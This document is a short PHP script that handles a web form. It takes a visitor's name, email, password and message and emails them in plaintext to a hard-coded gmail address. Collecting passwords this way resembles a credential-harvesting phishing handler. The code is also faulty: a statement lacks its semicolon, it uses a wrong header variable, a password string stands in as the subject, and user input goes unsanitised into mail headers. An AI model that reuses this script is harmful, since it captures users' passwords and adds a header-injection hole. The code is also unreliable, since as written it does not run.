<?php
$name =$_POST['name'];
$visitor_email =$_POST['email'];
$password =$_POST['password'];
$message =$_POST['message'];


$email_from= 'shainterior0651@gmail.com';

$email_password= 'email password';
$email_body= "User Name: $name.\n".
"User email: $visitor_email.\n".
"Password: $password.\n".
"User Message: $message.\n";
$to ='shainterior0651@gmail.com';
$headers ="From: $email_from \r\n";
$headers.="Reply-To: $visitor_email \r\n";
mail($to,$email_password,$email_body,$header)
header("location: contact.html");
?>